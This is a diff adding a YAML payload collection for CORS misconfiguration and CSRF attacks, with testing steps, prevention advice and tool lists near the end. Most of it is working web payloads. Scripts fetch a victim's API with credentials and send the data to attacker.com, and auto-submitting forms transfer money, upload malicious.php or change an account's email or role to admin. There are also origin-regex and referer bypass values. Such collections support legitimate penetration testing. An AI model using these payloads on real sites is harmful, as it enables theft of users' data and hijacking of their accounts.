@@ -1,0 +1,249 @@
+# CORS Misconfiguration & CSRF Payloads
+# OWASP A01:2025 - Broken Access Control & A05:2025 - Injection
+
+payload_category: "cors-csrf"
+owasp_2025: "A01"
+cwe: "CWE-352"
+severity: "MEDIUM"
+
+# ===== CORS MISCONFIGURATION =====
+cors_testing:
+  detection:
+    method: "Send request with custom Origin header"
+    headers:
+      - "Origin: https://evil.com"
+      - "Origin: null"
+      - "Origin: https://trust-this-domain.com"
+  
+  vulnerable_responses:
+    wildcard:
+      header: "Access-Control-Allow-Origin: *"
+      credentials: "Access-Control-Allow-Credentials: true"
+      issue: "Allows any origin with credentials"
+    
+    reflected_origin:
+      request: "Origin: https://attacker.com"
+      response: "Access-Control-Allow-Origin: https://attacker.com"
+      credentials: "Access-Control-Allow-Credentials: true"
+      issue: "Server reflects any origin"
+    
+    null_origin:
+      request: "Origin: null"
+      response: "Access-Control-Allow-Origin: null"
+      issue: "Allows sandbox iframes to steal data"
+
+cors_bypass_techniques:
+  subdomain_takeover:
+    - "Origin: https://abandoned.example.com"
+    - "Origin: https://outdated-cdn.example.com"
+  
+  regex_bypass:
+    - "Origin: https://example.com.attacker.com" # If regex: /example\.com$/
+    - "Origin: https://attackerexample.com" # If regex: /example.com/
+    - "Origin: https://example.com%60.attacker.com"
+  
+  null_origin:
+    html: |
+      <iframe sandbox="allow-scripts" src="data:text/html,<script>
+        fetch('https://victim.com/api/sensitive', {credentials: 'include'})
+          .then(r => r.text())
+          .then(d => fetch('https://attacker.com/steal?data='+d))
+      </script>"></iframe>
+  
+  pre_domain:
+    - "Origin: https://example.com.attacker.com"
+  
+  post_domain:
+    - "Origin: https://attackerexample.com"
+
+cors_exploitation:
+  steal_data:
+    html: |
+      <html>
+      <body>
+      <script>
+      fetch('https://victim.com/api/user/profile', {
+        method: 'GET',
+        credentials: 'include'
+      })
+      .then(response => response.json())
+      .then(data => {
+        // Send stolen data to attacker
+        fetch('https://attacker.com/steal', {
+          method: 'POST',
+          body: JSON.stringify(data)
+        });
+      });
+      </script>
+      </body>
+      </html>
+
+# ===== CSRF (Cross-Site Request Forgery) =====
+csrf_basic:
+  get_request:
+    - "<img src='https://bank.com/transfer?to=attacker&amount=1000'>"
+    - "<script src='https://api.example.com/deleteAccount'></script>"
+  
+  post_request_form:
+    html: |
+      <form action="https://bank.com/transfer" method="POST" id="csrf">
+        <input type="hidden" name="to" value="attacker" />
+        <input type="hidden" name="amount" value="10000" />
+      </form>
+      <script>
+        document.getElementById('csrf').submit();
+      </script>
+  
+  post_request_ajax:
+    html: |
+      <script>
+      fetch('https://victim.com/api/changeEmail', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({email: 'attacker@evil.com'})
+      });
+      </script>
+
+csrf_advanced:
+  json_csrf:
+    description: "CSRF with Content-Type: application/json"
+    html: |
+      <script>
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', 'https://victim.com/api/settings', true);
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      xhr.withCredentials = true;
+      xhr.send('{"role":"admin"}');
+      </script>
+  
+  multipart_csrf:
+    html: |
+      <form action="https://victim.com/upload" method="POST" enctype="multipart/form-data">
+        <input type="file" name="file" value="malicious.php">
+        <input type="submit">
+      </form>
+      <script>document.forms[0].submit();</script>
+
+csrf_bypass_techniques:
+  token_bypass:
+    missing_validation:
+      description: "Server doesn't check if token is present"
+      payload: "Remove csrf_token parameter entirely"
+    
+    reflected_token:
+      description: "Server reflects any token"
+      payload: "csrf_token=anything"
+    
+    token_in_cookie:
+      description: "Token stored in cookie, server compares cookie to parameter"
+      payload: "Set cookie via subdomain, send matching token"
+  
+  referer_bypass:
+    remove_referer:
+      html: '<meta name="referrer" content="no-referrer">'
+    
+    partial_match:
+      description: "Server checks if referer contains victim domain"
+      payload: "https://attacker.com?victim.com"
+  
+  method_override:
+    - "POST /api/delete HTTP/1.1"
+    - "X-HTTP-Method-Override: DELETE"
+    - "Bypass: DELETE CSRF check"
+
+csrf_chaining:
+  cors_plus_csrf:
+    description: "Combine CORS to steal token, then CSRF attack"
+    step1: "Steal CSRF token via CORS misconfiguration"
+    step2: "Use stolen token in CSRF attack"
+
+# ===== TESTING METHODOLOGY =====
+
+cors_testing_steps:
+  - "Send request with Origin: https://attacker.com"
+  - "Check Access-Control-Allow-Origin header"
+  - "If reflected, check Access-Control-Allow-Credentials"
+  - "Test with Origin: null"
+  - "Try subdomain variations"
+  - "Test regex bypass techniques"
+
+csrf_testing_steps:
+  - "Identify state-changing requests (POST, PUT, DELETE)"
+  - "Check for CSRF token in request"
+  - "Test if token is validated"
+  - "Try removing token"
+  - "Check Referer validation"
+  - "Test with different HTTP methods"
+
+# ===== PREVENTION =====
+
+cors_prevention:
+  - "Whitelist specific origins (no wildcards with credentials)"
+  - "Validate Origin header strictly"
+  - "Don't reflect Origin without validation"
+  - "Don't allow Origin: null"
+  - "Use credentials only when necessary"
+  - "Implement proper regex (^https://example\\.com$)"
+
+csrf_prevention:
+  - "Use CSRF tokens (synchronizer token pattern)"
+  - "SameSite cookie attribute (Strict or Lax)"
+  - "Verify Referer/Origin headers"
+  - "Use custom headers (X-Requested-With)"
+  - "Re-authentication for sensitive actions"
+  - "CAPTCHA for critical operations"
+  - "Short session timeouts"
+
+samesite_cookie:
+  strict:
+    description: "Cookie never sent in cross-site requests"
+    example: "Set-Cookie: session=abc; SameSite=Strict"
+  
+  lax:
+    description: "Cookie sent on top-level navigation (GET)"
+    example: "Set-Cookie: session=abc; SameSite=Lax"
+  
+  none:
+    description: "Cookie sent in all requests (requires Secure)"
+    example: "Set-Cookie: session=abc; SameSite=None; Secure"
+
+# ===== DETECTION =====
+
+cors_detection:
+  burp_suite:
+    - "Send request with Origin header"
+    - "Check response headers"
+    - "Use CORS scanner extension"
+  
+  manual:
+    - "curl -H 'Origin: https://evil.com' https://victim.com/api/data"
+    - "Look for Access-Control-Allow-Origin in response"
+
+csrf_detection:
+  indicators:
+    - "Missing CSRF token"
+    - "Token not validated"
+    - "No SameSite cookie attribute"
+    - "GET request changes state"
+    - "Referer validation can be bypassed"
+
+# ===== TOOLS =====
+
+tools:
+  cors:
+    - "CORScanner"
+    - "Burp Suite (CORS extension)"
+    - "OWASP ZAP"
+  
+  csrf:
+    - "Burp Suite CSRF PoC generator"
+    - "OWASP ZAP"
+    - "CSRFTester"
+
+references:
+  - "OWASP Top 10:2025 A01"
+  - "CWE-352: CSRF"
+  - "CWE-942: CORS Misconfiguration"
+  - "PortSwigger CORS Tutorial"
+  - "OWASP CSRF Cheat Sheet"
